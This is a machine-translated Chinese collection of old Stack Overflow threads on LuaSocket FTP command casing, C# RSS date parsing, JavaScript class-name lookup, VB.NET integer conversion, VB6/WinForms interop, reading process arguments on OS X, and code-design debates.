我在[LuaSocket](http://www.tecgraf.puc-rio.br/~diego/professional/luasocket/)的 TCP 设施上取得了成功，但我在使用它的 FTP 模块时遇到了问题。尝试检索（小）文件时，我总是会超时。我可以使用 Firefox 或 ftp 以被动模式（在 Ubuntu Dapper Linux 上）很好地下载文件。

我认为可能是我需要 LuaSocket 来使用被动 FTP，但后来我发现它似乎默认这样做。我试图通过 FTP 检索的文件可以通过我机器上的其他程序使用被动 FTP 访问，但不能通过主动模式访问。我在 LuaSocket 中发现[了一些](http://lua-users.org/lists/lua-l/2003-09/msg00217.html)关于“黑客”被动模式支持的讨论，并且该讨论意味着以后的版本停止使用被动模式，但我的版本似乎仍然使用被动模式（我使用的是 2.0.1；最新的是 2.0.2 并且确实似乎没有与我的用例相关的任何更改）。我对那篇文章可能与我的情况有什么关系感到有些困惑，部分原因是它已经很老了，而且 LuaSocket 的源代码现在与该讨论中的代码几乎没有相似之处）。

我把我的代码归结为：

```
local ftp = require "socket.ftp"
ftp.TIMEOUT = 10
print(ftp.get("ftp://ftp.us.dell.com/app/dpart.txt")) 
```

这给了我一个超时。我`strace`在 Linux 上运行它（与`ptrace`在 Solaris 上相同）。这是一个删节的成绩单：

```
socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
fcntl64(3, F_SETFL, O_RDWR|O_NONBLOCK)  = 0
recv(3, "230-Welcome to the Dell FTP site."..., 8192, 0) = 971
send(3, "pasv\r\n", 6, 0)               = 6
recv(3, 0x8089a58, 8192, 0)             = -1 EAGAIN (Resource temporarily unavailable)
select(4, [3], NULL, NULL, {9, 999934}) = 0 (Timeout) 
```

我尝试连接到另一个站点，但它有一个我无法在此处发布的密码，但在这种情况下，结果略有不同......我得到了类似上面的跟踪但`select()`最后成功了，然后是：

```
recv(3, "227 Entering Passive Mode (123,456,789,0,12,34)\r\n", 8192, 0) = 49
socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 4
fcntl64(4, F_SETFL, O_RDWR|O_NONBLOCK)  = 0
connect(4, {sa_family=AF_INET, sin_port=htons(12345), sin_addr=inet_addr("123.456.789.0")}, 16) = -1 EINPROGRESS (Operation now in progress)
select(5, [4], [4], NULL, {9, 999694})  = 0 (Timeout) 
```

将此与我在被动模式下的“ftp”程序的跟踪进行比较（工作正常，但请注意它不会像 LuaSocket 那样将套接字设置为非阻塞）：

```
socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 6
write(5, "PASV\r\n", 6)                 = 6
read(3, "227 Entering Passive Mode (123,456,789,0,12,34)\r\n", 1024) = 51
connect(6, {sa_family=AF_INET, sin_port=htons(12345), sin_addr=inet_addr("123.456.789.0")}, 16) = 0 
```

因此，我针对这两个不同的 FTP 站点尝试了 LuaSocket，但故障不同但相似。我还在另一台可以使用主动 FTP 的机器上尝试过它，但它没有更好的运气（大概是因为 LuaSocket 总是使用被动模式，从我可以通过阅读 中的源代码得知`socket/ftp.lua`）。

那么这里的任何人都可以让 LuaSocket 两线在顶部工作吗？请注意，在我的机器上，到戴尔站点的活动 FTP 不起作用（我可以连接，但一旦我`ls`断开连接），所以如果你让 LuaSocket 工作，请注意从另一个程序到戴尔站点的活动 FTP 是否工作你的机器。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-18T02:54:52.493

嗯。看起来问题在于 LuaSocket 使用小写的“pasv”。我将尝试找出解决方法。

* * *

嗯。不，它看起来非常优雅地焊接在一起。最简单的做法可能是*将该特定文件*复制到 LUA_PATH 中较早路径的层次结构中的等效位置。也就是说，（通常）制作文件的本地副本，例如`path/to/your/project/socket/ftp.lua`.

然后编辑本地文件：

```
-    self.try(self.tp:command("user", user or USER))
+    self.try(self.tp:command("USER", user or USER))
-        self.try(self.tp:command("pass", password or PASSWORD))
+        self.try(self.tp:command("PASS", password or PASSWORD))
-    self.try(self.tp:command("pasv"))
+    self.try(self.tp:command("PASV"))
-    self.try(self.tp:command("port", arg))
+    self.try(self.tp:command("PORT", arg))
-    local command = sendt.command or "stor"
+    local command = sendt.command or "STOR"
-    self.try(self.tp:command("cwd", dir))
+    self.try(self.tp:command("CWD", dir))
-    self.try(self.tp:command("type", type))
+    self.try(self.tp:command("TYPE", type))
-    self.try(self.tp:command("quit"))
+    self.try(self.tp:command("QUIT")) 
```

反常地，使用 getfenv、getmetatable 等进行的 navelnaut 探险似乎并不值得。我认为这是设计的一个严重问题。（LuaSocket 的）

值得注意的是，[RFC0959](ftp://ftp.rfc-editor.org/in-notes/rfc959.txt)使用全大写命令。（可能是因为它来自 7 位 ASCII 时代。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-11-07T16:38:05.730

请注意，服务器未能遵循 FTP 规范，该规范指出命令不区分大小写。请参阅 RFC959，第 5.3 节“命令代码是四个或更少的字母字符。大小写字母字符将被同等对待。因此，以下任何一个都可能代表检索命令：RETR Retr retr ReTr rETr”

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-11-07T21:19:06.007

这个问题现在已经解决了，对问题和第一个答案有很大帮助。

Luasocket 对 RFC 959 是正确的（这里的第一条评论对于大写是不正确的，参见 RFC959 第 5.2 节）

至少 Microsoft FTP 服务器不兼容。可能还有其他人。

解决方案是将 pasv 更改为 PASV，并且是命令区分大小写服务器的解决方法。详细信息在 Lua 电子邮件列表中，档案将在几天后通过网络访问。

（编辑 ftp.lua 的第 59 行）

# c# - 使用 C# 和 .net 3.5 读取 RSS 的问题

> ID：210375
> 
> 赞同：16
> 
> 时间：2008-10-16T21:27:09.567
> 
> 标签：c#, rss, syndication

我一直在尝试使用 System.ServiceModel.Syndication 中可用的新例程编写一些例程来读取 RSS 和 ATOM 提要，但不幸的是，Rss20FeedFormatter 轰炸了我尝试的大约一半提要，但有以下例外：

> ```
> An error was encountered when parsing a DateTime value in the XML. 
> ```

每当 RSS 提要以以下格式表示发布日期时，这似乎就会发生：

> 2008 年 10 月 16 日星期四 14:23:26 -0700

如果提要将发布日期表示为 GMT，则一切正常：

> 格林威治标准时间 10 月 16 日星期四 21:23:26

如果有一些方法可以使用 XMLReaderSettings 解决这个问题，我还没有找到它。有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2010-04-27T20:16:18.177

根据[向 Microsoft 发布的错误报告中](https://connect.microsoft.com/VisualStudio/feedback/ViewFeedback.aspx?FeedbackID=325421&wa=wsignin1.0)发布的解决方法，我制作了一个 XmlReader，专门用于读取具有非标准日期的 SyndicationFeeds。

下面的代码与 Microsoft 网站上的解决方法中的代码略有不同。它还采纳了[反对党](https://stackoverflow.com/questions/210375/problems-reading-rss-with-c-and-net-3-5/263137#263137)关于使用 RFC 1123 模式的建议。

您需要从 Stream 创建 XmlReader，而不是简单地调用 XmlReader.Create()。我使用 WebClient 类来获取该流：

```
WebClient client = new WebClient();
using (XmlReader reader = new SyndicationFeedXmlReader(client.OpenRead(feedUrl)))
{
    SyndicationFeed feed = SyndicationFeed.Load(reader);
    ....
    //do things with the feed
    ....
} 
```

下面是 SyndicationFeedXmlReader 的代码：

```
public class SyndicationFeedXmlReader : XmlTextReader
{
    readonly string[] Rss20DateTimeHints = { "pubDate" };
    readonly string[] Atom10DateTimeHints = { "updated", "published", "lastBuildDate" };
    private bool isRss2DateTime = false;
    private bool isAtomDateTime = false;

    public SyndicationFeedXmlReader(Stream stream) : base(stream) { }

    public override bool IsStartElement(string localname, string ns)
    {
        isRss2DateTime = false;
        isAtomDateTime = false;

        if (Rss20DateTimeHints.Contains(localname)) isRss2DateTime = true;
        if (Atom10DateTimeHints.Contains(localname)) isAtomDateTime = true;

        return base.IsStartElement(localname, ns);
    }

    public override string ReadString()
    {
        string dateVal = base.ReadString();

        try
        {
            if (isRss2DateTime)
            {
                MethodInfo objMethod = typeof(Rss20FeedFormatter).GetMethod("DateFromString", BindingFlags.NonPublic | BindingFlags.Static);
                Debug.Assert(objMethod != null);
                objMethod.Invoke(null, new object[] { dateVal, this });

            }
            if (isAtomDateTime)
            {
                MethodInfo objMethod = typeof(Atom10FeedFormatter).GetMethod("DateFromString", BindingFlags.NonPublic | BindingFlags.Instance);
                Debug.Assert(objMethod != null);
                objMethod.Invoke(new Atom10FeedFormatter(), new object[] { dateVal, this });
            }
        }
        catch (TargetInvocationException)
        {
            DateTimeFormatInfo dtfi = CultureInfo.CurrentCulture.DateTimeFormat;
            return DateTimeOffset.UtcNow.ToString(dtfi.RFC1123Pattern);
        }

        return dateVal;

    }

} 
```

同样，这几乎完全是从上面链接中 Microsoft 网站上发布的解决方法复制而来的。...除了这个对我有用，而在微软发布的那个没有。

**注意**：您可能需要做的一点定制是在课程开始时的两个数组中。根据您的非标准提要可能添加的任何无关字段，您可能需要向这些数组添加更多项目。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2008-11-04T19:37:59.237

RSS 2.0 格式的联合提要在序列化*pubDate*和*lastBuildDate等元素时使用*[RFC 822 日期时间规范](http://www.w3.org/Protocols/rfc822/#z28)。不幸的是，RFC 822 日期时间规范是一种非常“灵活”的语法，用于表达 DateTime 的时区组件。

 ***时区可以用几种方式表示。“UT”是世界时（以前称为“格林威治标准时间”）；允许“GMT”作为通用时间的参考。军用标准对每个区域使用一个字符。“Z”是世界时。“A”表示提前一小时，“M”表示提前12小时；“N”是一小时后，“Y”是 12 小时后。不使用字母“J”。其余两种形式取自 ANSI 标准 X3.51-1975。一个允许明确指示与 UT 的偏移量；另一个使用通用的 3 字符字符串来指示北美的时区。*

我相信这个问题涉及如何处理RFC 822 日期时间值的**区域组件。**提要格式化程序似乎没有处理利用**本地差异**来指示时区的日期时间。

由于 RFC 1123 扩展了 RFC 822 规范，您可以尝试使用[DateTimeFormatInfo.RFC1123Pattern](http://msdn.microsoft.com/en-us/library/system.globalization.datetimeformatinfo.rfc1123pattern.aspx) ("r") 来处理转换问题日期时间，或者为 RFC 822 格式化日期编写自己的解析代码。另一种选择是使用第三方框架而不是 System.ServiceModel.Syndication 命名空间类。

Microsoft 正在解决日期时间解析和 Rss20FeedFormatter的一些[已知问题。](http://connect.microsoft.com/VisualStudio/feedback/ViewFeedback.aspx?FeedbackID=325421)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-19T03:06:12.437

有趣的。看起来日期时间格式不是日期时间解析器自然期望的格式之一。在查看提要类之后，您似乎无法为解析器注入自己的格式约定，并且它们可能使用特定的方案来验证感觉。

您可以通过修改[文化](http://msdn.microsoft.com/en-us/library/2h3syy57.aspx)来更改日期时间解析器的行为方式。我以前从未做过，所以我不能肯定它会起作用。

另一个解决方案是首先转换您要阅读的提要。可能不是最好的，但它可以让你解决这个问题。

祝你好运。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2010-09-13T04:23:31.107

类似的问题在 .NET 4.0 中仍然存在，我决定使用**XDocument**而不是直接调用**SyndicationFeed**。我描述了应用的方法（特定于我的项目[here](http://dennisdel.com/?p=342)）。不能说这是最好的解决方案，但如果**SyndicationFeed**失败，它肯定可以被视为“备用计划”。

# javascript - 获取具有特定 CSS 类的 HTML 文档中的所有元素

> ID：210377
> 
> 赞同：39
> 
> 时间：2008-10-16T21:27:37.163
> 
> 标签：javascript, html, css

使用javascript获取具有特定CSS类的html文档中所有元素的数组的最佳方法是什么？

现在这里不允许使用像 jQuery 这样的 javascript 框架，我可以循环所有元素并自己手动检查它们。我希望有一些更优雅的东西。

* * *

## 回答 #1

> 赞同：38
> 
> 时间：2008-10-16T21:32:10.167

1) 获取文档中的所有元素 (document.getElementsByTagName('*'))
2) 对每个元素的元素的 className 属性进行正则表达式匹配

* * *

## 回答 #2

> 赞同：36
> 
> 时间：2008-10-16T21:33:55.420

下面的答案现在已经推出四年了，所以值得注意的是，原生浏览器支持[`getElementsByClassName()`](https://developer.mozilla.org/en-US/docs/Web/API/document.getElementsByClassName)已经变得*更好*了。但是，如果您必须支持较旧的浏览器，那么...

使用已经写好的。大多数主要的 JS 库都包含某种形式的库，但是如果您不使用其中之一，那么我可以推荐 Robert Nyman 的出色实现：

[http://code.google.com/p/getelementsbyclassname/](http://code.google.com/p/getelementsbyclassname/)
[http://www.robertnyman.com/2008/05/27/the-ultimate-getelementsbyclassname-anno-2008/](http://www.robertnyman.com/2008/05/27/the-ultimate-getelementsbyclassname-anno-2008/)

有太多方法可以使这个（概念上简单的）例程变得*缓慢和错误*，以证明此时编写自己的实现是合理的。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2008-10-16T21:31:32.850

您可以包含[getElementsByClass](http://www.dustindiaz.com/getelementsbyclass/)函数，也可以使用[jQuery 选择器](http://docs.jquery.com/Selectors/class#class)。

**更新：** @ [Shog9](https://stackoverflow.com/questions/210377/get-all-elements-in-an-html-document-with-a-specific-css-class#210393)提到的[实现](http://www.robertnyman.com/2008/05/27/the-ultimate-getelementsbyclassname-anno-2008/)可能比上面的要好。

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2008-10-17T17:16:25.877

只是为了做一些跟进，我的代码基于 Shog9 发布的 Robert Nyman 实现，但与他的确切版本略有不同，原因有以下三个：

1.  他允许你选择一个根元素和标签类型来过滤你的结果。我不需要该功能，因此通过删除它，我能够显着简化代码。
2.  他的代码做的第一件事是查看所讨论的函数是否已经存在，如果存在，他还是提供了自己的实现。这看起来……很奇怪。我知道他是在为原版添加功能，但同样：我没有使用这些功能。
3.  我想要一个额外的语法糖——能够像我调用`document.getElementById()`或调用它一样调用它`document.getElementsByTagName()`。

请注意，我仍然主要依赖他的代码。他的 javascript 技能显然远远超出了我的水平。我确实试图排除一些冗余变量，但仅此而已。

考虑到这一点，这就是我最终得到的结果（*似乎*适用于 IE6、IE7、Firefox 3 和 Chrome，**请参阅末尾的新注释**）：

```
 if (!document.getElementsByClassName)
    document.getElementsByClassName = function (className)
{
    var classes = className.split(" ");
    var classesToCheck = "";
    var returnElements = [];
    var match, node, elements;

    if (document.evaluate)
    {    
        var xhtmlNamespace = "http://www.w3.org/1999/xhtml";
        var namespaceResolver = (document.documentElement.namespaceURI === xhtmlNamespace)? xhtmlNamespace:null;

        for(var j=0, jl=classes.length; j<jl;j+=1)
            classesToCheck += "[contains(concat(' ', @class, ' '), ' " + classes[j] + " ')]"; 

        try
        {
            elements = document.evaluate(".//*" + classesToCheck, document, namespaceResolver, 0, null);
        }
        catch(e)
        {
            elements = document.evaluate(".//*" + classesToCheck, document, null, 0, null);
        }

        while ((match = elements.iterateNext()))
            returnElements.push(match);
    }
    else
    {
        classesToCheck = [];
        elements = (document.all) ? document.all : document.getElementsByTagName("*");

        for (var k=0, kl=classes.length; k<kl; k+=1)
            classesToCheck.push(new RegExp("(^|\\s)" + classes[k] + "(\\s|$)"));

        for (var l=0, ll=elements.length; l<ll;l+=1)
        {
            node = elements[l];
            match = false;
            for (var m=0, ml=classesToCheck.length; m<ml; m+=1)
            {
                match = classesToCheck[m].test(node.className);
                if (!match) break;
            }
            if (match) returnElements.push(node);
        } 
    }
    return returnElements;
} 
```

**更新：**
对此有一个新说明。从那以后，我重新阅读了有关原始实现的注释，现在我明白，如果现有浏览器有自己的实现，我的代码可能会失败，因为默认实现返回一个节点列表，其中返回一个数组。这包括更新的 firefox 和 safari 以及 opera 浏览器。大多数时候这无关紧要，但在某些情况下可能。这解释了上面列表中的第 2 项。

这意味着虽然我的代码在技术上确实可以在任何地方工作，但它可能会导致在不同的地方出现细微的不同（阅读：难以调试）的行为，这并不好。我*应该*解决这个问题，要么返回一个节点列表，要么覆盖提供的方法以返回一个数组（这是原来的做法）。可能前者会更简单，但后者会*更好*。

但是，它目前在本地 Intranet 环境（几乎所有 IE）中工作，所以我暂时将修复作为练习留给读者。

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2009-05-14T17:13:19.820

如果使用框架，它们都使用 CSS 选择器进行选择。除此以外。

```
var getElementsByClassName = function(cls, sc){
    //Init
    var elements, i, results = [], curClass;  

    //Default scope is document
    sc = sc || document;

    //Get all children of the scope node
    elements = sc.getElementsByTagName('*');
    for( i=0; i < elements.length; i++ ){
        curClass = elements[i].getAttribute('class');
        if(curClass != null){
            curClass = curClass.split(" ");
            for( j=0; j < curClass.length; j++){
                if(curClass[j] === cls){
                    results.push( elements[i] );
                    break;
                }
            }
        }
    }

    return results;
}; 
```

现在才写，只为你。:) 随意使用。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2008-10-16T21:35:07.943

使用[jquery](http://docs.jquery.com/Selectors)，再方便不过了。

$(".theclass") 或 $(".theclass"),makeArray() 如果你想要一个原生 JS 数组

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2008-11-06T18:04:40.157

请记住，至少 FF3 已经有了 getElementsByClassName afaik 的本机实现。

如果您要实现自己的解决方案，也许您应该尝试找到一个 xpath 解决方案，因为所有现代浏览器都对 xpath 具有原生支持。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2011-01-27T18:48:31.533

@shog9、@user28742、@bdukes - 我正在 SharePoint 中针对模块化事物（自定义字段定义）进行一些自定义开发，我希望可以在许多站点中重复使用。

因为我无法提前知道任何给定的 SharePoint 网站是否有 jQuery 或任何其他可用的库 --- 我仍然需要用原始 javascript 编写东西，这样我才能对我的功能有一定的信心试图实现将独立存在。

感谢 Dmitri 的具体实施。对于我的目的来说足够短。

在最近的其他努力中，我不得不修改（我的客户选择的）电子商务商店，并且我尝试将 jQuery 安装到其中的一些尝试实际上与他们之前安装的任何自定义库发生冲突。我本可以坚持不懈，并且想出一种方法将 jQuery 实现到他们的专有系统中......或者......甚至更快......只需编写一些好的老式 javascript。

图书馆并不总是最好的答案！！！！！！！！！！！！！！！

（我爱 jQuery 胜过我的祖母）

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-10-16T21:32:04.503

没有 CSS 类这样的东西。CSS 有规则集和选择器（包括类选择器）。

你的意思是一个HTML类？通常的方法是遍历文档中的每个元素（`using document.getElementsByTagName('*')`（为了提高效率，如果您知道该类只会应用于特定类型的元素，请使用特定的标签名称）并测试`className`每个元素的属性（注意该属性包含空格分隔的类名列表，而不是单个类名）。

许多库（例如[jQuery](http://docs.jquery.com/Selectors/)或[YUI](http://developer.yahoo.com/yui/docs/YAHOO.util.Dom.html#method_getElementsByClassName)）具有简化此功能的功能。

你是说 CSS 选择器吗？这变得更加复杂，并且几乎可以肯定的是，转向图书馆是正确的做法。同样，jQuery 或[YUI](http://developer.yahoo.com/yui/selector/)是不错的选择。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2010-11-12T07:19:07.640

如果您想对文档中具有相同 id 的所有元素执行某些操作。虽然简单但有时头脑不发出绿色信号

```
var x = document.getElementById(elementid);
while(x){
document.removechild(x);
x = document.getElementById(elementid);
} 
```

# vb.net - UInt32 到 Int32

> ID：210383
> 
> 赞同：2
> 
> 时间：2008-10-16T21:30:22.480
> 
> 标签：vb.net, overflow

如果我有一个返回 Int32 的 VB.Net 函数，但使用无符号整数 (UInt32) 进行计算等。如何将值为“3392918397”的变量“MyUintVar32”转换为 VB.Net 中的标准 Int32 ?

在 c# 中，如果我只执行“return (int)(MyUintVar32);”，我会得到 -902048899，而不是错误。

我尝试了几种不同的方法。c# 处理这些转换的方式与 VB.Net 有什么区别？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2011-04-01T16:58:32.470

我意识到这是一个旧帖子，但问题尚未得到解答。我想知道的其他人：

```
Dim myUInt32 As UInt32 = 3392918397  
Dim myInt32 As Int32 = Convert.ToInt32(myUInt32.ToString("X"), 16) 
```

反向操作：

```
myUInt32 = Convert.ToUInt32(myInt32.ToString("X"), 16) 
```

此外，可以创建一个联合结构来轻松地在 Int32 和 UInt32 之间进行转换：

```
Imports System.Runtime.InteropServices

<StructLayout(LayoutKind.Explicit)> _    
  Public Structure UnionInt32  
  <FieldOffset(0)> _  
  Public IntValue As Int32  
  <FieldOffset(0)> _  
  Public UIntValue As UInt32  
End Structure  

Dim MyUnionInt32 as UnionInt32  
MyUnionInt32.UIntValue = 3392918397  
Dim IntVal as Int32 = MyUnionInt32.UIntValue  '= -902048899 
```

反向操作：

```
MyUnionInt32.IntValue = -902048000  
Dim UIntVal as UInt32 = MyUnionInt32.UIntValue  '= 3392919296 
```

干杯， TENware

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-16T21:35:33.513

3392918397 太大而无法放入带符号的 32 位整数中，这就是它出现负数的原因，因为设置了 3392918397 的最高有效位。

1100 1010 0011 1011 1101 0011 0111 1101

如果你想在有符号整数类型中保持这个比例的整数，你需要使用下一个大小，一个 64 位有符号整数。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-16T21:35:33.013

这不是最佳解决方案，但您可以使用 BitConverter 从 uint 获取字节数组并将字节数组转换为 int。

```
Dim myUInt32 As UInt32 = 3392918397
Dim myInt32 As Int32 = BitConverter.ToInt32(BitConverter.GetBytes(myUInt32), 0) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-16T21:36:41.140

您无法将 3392918397 转换为 Int32，因为该数字太大而无法容纳 31 位。为什么不直接更改函数以返回 UInt32？

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2008-10-16T21:46:33.273

或者在完成 Uint32 工作后，对照 MAXINT 和 0 检查它。

如果 > MAXINT 和 < 0 那么你没问题。如果不是你“溢出”并且应该抛出异常。

我不记得是否定义了 MAXINT。您可以使用： 2^31 - 1 代替。

# c# - 在 VB6 应用程序中托管 C# winforms

> ID：210391
> 
> 赞同：6
> 
> 时间：2008-10-16T21:33:17.263
> 
> 标签：c#, winforms, vb6

我有一个 VB 6 应用程序，我们开始将它移植到 C#。我们已经完成了其中一个屏幕，想看看是否有一种在 VB 中托管 winform 的增量方式，以开始让现有用户习惯新屏幕。这是一个迁移策略..

有什么想法吗。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-10-17T01:08:50.790

Interop Forms Toolkit 允许您创建可在 VB 6.0 应用程序中使用的 .NET 表单和用户控件。这允许您随着时间的推移将 VB 6.0 应用程序迁移到 .NET（一次一个表单或一个表单的一部分）。但是，该工具包依赖于 Microsoft.VisualBasic 程序集和 VB.NET 编译器的功能，因此它不适用于 C#。

[CodeProject.com](http://www.codeproject.com/)上有几篇文章/示例讨论了该工具包以及如何将其与 C# 一起使用。

[Interop Forms Toolkit 2.0 教程](http://www.codeproject.com/KB/vb-interop/VB6InteropToolkit2.aspx)

[VB6 - C# 互操作表单工具包](http://www.codeproject.com/KB/dotnet/VB6_-_C__Interop_Form.aspx)

Beth Massi 有几篇关于使用工具包的文章和网络广播，您可以参考。查看[她的博客](http://blogs.msdn.com/bethmassi)以获取资源链接。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-16T21:38:31.247

你[看过这个吗？](http://hubpages.com/hub/Interop_Forms_Toolkit_10)在此处直接链接到[产品](http://msdn.microsoft.com/en-us/vbasic/bb419144.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-01-21T12:44:12.997

如果您主要只是希望您的 VB6 程序显示 .NET Winform，则不需要任何第三方工具来解决 Visual Studio 附带的任何内容。

我们在这里采用的方法是通过给它一个 COM 接口来向 VB6 公开一个 C# 包装器类。这个类有一些可以从 VB6 调用的方法。他们依次实例化并显示 Winform。它运作良好。

# c - 使用 C 在 OS X 中获取其他进程的 argv

> ID：210397
> 
> 赞同：4
> 
> 时间：2008-10-16T21:34:30.490
> 
> 标签：c, macos, argv

我想获得其他进程的 argv，例如 ps。

我正在使用在 Intel 或 PowerPC 上运行的 Mac OS X 10.4.11。

首先，我阅读了 ps 和 man kvm 的代码，然后我编写了一些 C 代码。

```
#include <kvm.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <paths.h>

int
main(void) {
    char errbuf[1024];
    kvm_t *kd = kvm_openfiles(_PATH_DEVNULL, NULL, _PATH_DEVNULL, O_RDONLY, errbuf);
    int num_procs;
    if (!kd) { fprintf(stderr, "kvm_openfiles failed : %s\n", errbuf); return 0; }
    struct kinfo_proc *proc_table = kvm_getprocs(kd, KERN_PROC_ALL, 0, &num_procs);

    for (int i = 0; i < num_procs; i++) {
        struct kinfo_proc *pproc = &proc_table[i];
        char **proc_argv = kvm_getargv(kd, pproc, 0);
        printf("%p\n", proc_argv);
    }

    kvm_close(kd);
    return 0;
} 
```

在 PowerPC 上运行时，`kvm_getargv()`总是返回 NULL。在 Intel 上运行时，`kvm_openfiles()`失败并出现错误`/dev/mem: No such file or directory`。

当然，我知道许可。

其次，我尝试了 sysctl。

```
#include <sys/sysctl.h>
#include <stdio.h>
#include <stdlib.h>
#define pid_of(pproc) pproc->kp_proc.p_pid

int
main(void) {

   int mib[4] = { CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0 };
   int buffer_size;
   sysctl(mib, 4, NULL, &buffer_size, NULL, 0);

   struct kinfo_proc *result = malloc(buffer_size);
   sysctl(mib, 4, result, &buffer_size, NULL, 0);

   int num_procs = buffer_size / sizeof(struct kinfo_proc);
   for (int i = 0; i < num_procs; i++) {
       struct kinfo_proc *pproc = result + i;
       int mib[3] = { CTL_KERN, KERN_PROCARGS, pid_of(pproc) }; // KERN_PROC_ARGS is not defined
       char *proc_argv;
       int argv_len;
       sysctl(mib, 3, NULL, &argv_len, NULL, 0);
       proc_argv = malloc(sizeof(char) * argv_len);
       sysctl(mib, 3, proc_argv, &argv_len, NULL, 0);
       fwrite(proc_argv, sizeof(char), argv_len, stdout);
       printf("\n");
       free(proc_argv);
   }

   return 0;
} 
```

通过 fwrite，我得到了 argv[0] 但 argv[1..] 没有（打印出环境变量。）

没有更多的办法了吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-17T00:27:08.487

实际上，对于我正在编写的 Python 库，我一直需要同样的东西，并且在我的搜索中，我遇到了另一个 Python 库（[PSI](https://bitbucket.org/chrismiles/psi)），它在 C 代码中实现了这一点。它是列出进程的 python 模块代码的一部分，还包括列出每个进程的参数。您可以查看源代码作为一个工作示例：

[**darwin_process.c**](https://bitbucket.org/chrismiles/psi/src/tip/src/arch/darwin_process.c) - 向下滚动到*set_exe()*以获取相关代码

注意：该站点*确实很*慢，因此在加载时您必须有点耐心。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2011-01-08T08:58:08.467

在 10.6 中，KERN_PROCARGS2 可用：[https ://gist.github.com/770696](https://gist.github.com/770696)

这种方式用于 ps、MacFUSE 上的 procfs 等。

# architecture - 你如何让人们重视抽象和灵活性而不是“完成它”？

> ID：210421
> 
> 赞同：7
> 
> 时间：2008-10-16T21:44:52.870
> 
> 标签：architecture, encapsulation, abstraction

当其他人希望跳过官方接口并直接访问底层实现细节时，我有时会遇到困难。

他们认为这样做可以让他们更快地解决问题。我认为这样做会导致我们的架构变得更加紧密耦合，并且随着新需求的出现难以改变。

我指出了当前设计中的所有工作以及设计理念和灵活性的价值，尝试维护和更改脆弱代码的成本，封装和数据隐藏和分层架构的价值以及健壮性，所以规范的微小变化会导致代码的微小变化。他们说“但这会更容易。”

你怎么对付这些人？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-10-16T22:10:28.683

让他们处理一些修复其中错误的遗留代码。这几乎就是我认识的大多数人学到这些非常有价值的课程的方式......艰难的方式。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2008-10-16T21:56:52.363

说服他们走捷径是一种虚假的经济。

说明最初的*编码*工作不到初始开发工作的 30%，不到整个项目工作（包括维护）的 10%（根据我的经验）。

如果他们仍然不相信，而你有权这样做，那么告诉他们按照你的方式去做。如果你没有权限，那就什么都不做。最终你的主管，如果她有价值的话，会认识到这一点，然后你将处于权威的位置。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-10-16T22:01:46.580

“更容易”什么时候？现在，当一切都没有变化时？或者从现在起三个月后，当客户的要求发生变化并且他们有一个不再是解决方案的“解决方案”时？

为了结构和规则，我不太喜欢结构和规则，但很高兴知道 A）谁在驾驶船 B）规则是什么以及 C）为什么我们选择这样做。

在我的商店里，我们不喜欢重写代码，因为我们搞砸了一堆东西并对其进行了硬编码，或者为问题创建了一些脆弱的“解决方案”。一旦人们意识到，当事情被一堆需求更改颠倒时，它会减少以后的挫败感，遵循更灵活的方法往往不会变得更加困难。通常，我们为“长期”而不是“今天需要”而编码，因此设计是**有原因**的，设计也是**出于**同样的原因。

我花了一周的时间（连续 7 天）重写一个模块，因为我处于“快速完成”模式。7 天的艰苦时间，10 到 12 小时的正确方法，在比赛后期，那时我本可以观看超级碗。那个臭 我在那里吸取了教训。可能你的“朋友”也需要体验这种大开眼界。

祝你好运！

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2008-10-17T02:01:30.233

我实际上讨厌对此持不同意见，但是...

引用范海伦（引用陈词滥调）的话，“每件事都有时间和地点。” 虽然我当然不提倡写得不好，但有时你确实需要完成它，并在健壮/持久和被黑客入侵/记录之间找到快乐的媒介。（记录在案的部分特别重要，在两个方面：第一，你清楚地表明无论你在做什么，只是为了完成它，并采取某些捷径；第二，一个粗略的想法至于解决问题的更正确方法可能是什么。

作为程序员，我们经常努力编写完美的代码（嗯，我们中的一些人这样做），有时会忽略大局 - 有很多原因可以（在一定程度上）快速和松散地玩使用代码，同时最大限度地减少未来的影响。

请不要以此为理由——当然，这里适用 80/20 规则。大多数时候，您绝对想打破这些路线的任何捷径；但有时候...

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-10-16T21:47:59.090

最好的办法可能是将他们提拔为管理层，这样他们就不会造成太大的损害。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2008-10-16T22:18:35.797

